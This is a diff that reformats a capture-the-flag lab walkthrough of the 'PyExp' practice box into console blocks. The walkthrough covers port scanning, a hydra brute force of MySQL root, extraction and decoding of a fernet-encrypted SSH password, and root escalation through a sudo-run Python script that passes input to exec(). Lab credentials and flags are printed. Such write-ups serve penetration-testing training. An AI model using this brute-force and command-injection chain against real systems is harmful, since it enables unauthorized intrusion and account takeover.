@@ -1,3 +1,5 @@
+
+```console
 root@kali:/OSCPv3/offsec/PyExp# nmap -Pn -sT -n 192.168.58.118  -p- --min-rate 1000 --max-retries 2 --reason
 Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-11 21:02 CDT
 Warning: 192.168.58.118 giving up on port because retransmission cap hit (2).
@@ -12,9 +14,9 @@ PORT     STATE SERVICE REASON
 3306/tcp open  mysql   syn-ack
 
 Nmap done: 1 IP address (1 host up) scanned in 77.94 seconds
+```
 
-
-
+```console
 root@kali:/OSCPv3/offsec/PyExp# nmap -Pn -sT -sV -n 192.168.58.118 -p 1337,3306 --min-rate 1000  --reason
 Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-11 21:07 CDT
 Nmap scan report for 192.168.58.118
@@ -27,10 +29,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
-root@kali:/OSCPv3/offsec/PyExp# 
+```
 
-
-
+```console
+root@kali:/OSCPv3/offsec/PyExp/cve-2016-6662# hydra -f -T 120 -t 120 -l root -P /usr/share/wordlists/rockyou.txt 192.168.58.118 mysql -v -V
+...
 [VERBOSE] using default db 'mysql'
 [ATTEMPT] target 192.168.58.118 - login "root" - pass "princess101" - 9988 of 0 [child 14344399] (0/2)
 [ATTEMPT] target 192.168.58.118 - login "root" - pass "prettywoman" - 9989 of 0 [child 14344399] (0/0)
@@ -44,9 +47,9 @@ root@kali:/OSCPv3/offsec/PyExp#
 [STATUS] attack finished for 192.168.58.118 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (http://www.thc.org/thc-hydra) finished at 2021-10-11 23:21:17
-root@kali:/OSCPv3/offsec/PyExp/cve-2016-6662# hydra -f -T 120 -t 120 -l root -P /usr/share/wordlists/rockyou.txt 192.168.58.118 mysql -v -V
+```
 
-
+```console
 root@kali:/OSCPv3/offsec/PyExp# mysql -h 192.168.58.118 -u root -p 
 Enter password: 
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
@@ -91,14 +94,14 @@ MariaDB [data]> select * from fernet;
 +--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
 1 row in set (0.12 sec)
 
-
+```
 
 
 
 https://asecuritysite.com/encryption/ferdecode
 lucy:wJ9`"Lemdv9[FEw-
 
-
+```console
 root@kali:/OSCPv3/offsec/PyExp/cve-2016-6662# ssh lucy@192.168.58.118 -p 1337
 lucy@192.168.58.118's password: 
 Linux pyexp 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
@@ -111,8 +114,10 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 lucy@pyexp:~$ whoami
 lucy
+```
 
 
+```console
 lucy@pyexp:~$ sudo -l
 Matching Defaults entries for lucy on pyexp:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -124,10 +129,11 @@ lucy@pyexp:~$ ls -la /opt/exp.py
 lucy@pyexp:~$ more /opt/exp.py 
 uinput = raw_input('how are you?')
 exec(uinput)
+```
 
 https://www.geeksforgeeks.org/exec-in-python/
 
-
+```console
 lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py 
 how are you?import os;os.system('whoami')
 root
@@ -139,8 +145,8 @@ lucy@pyexp:~$ /bin/bash -p
 bash-5.0# whoami
 root
 bash-5.0# 
-
-
+```
+```console
 bash-5.0# cat user.txt 
 Your flag is in another file...
 bash-5.0# pwd
@@ -148,8 +154,9 @@ bash-5.0# pwd
 bash-5.0# cat local.txt 
 7616b643bd382514207a72e6f3ed256c
 bash-5.0#
+```
 
-
+```console
 bash-5.0# cd /root
 bash-5.0# ls
 proof.txt  root.txt
@@ -158,4 +165,4 @@ Your flag is in another file...
 bash-5.0# cat proof.txt 
 230f0021d33aca8bec4af5764baf0cc6
 bash-5.0#
-
+```
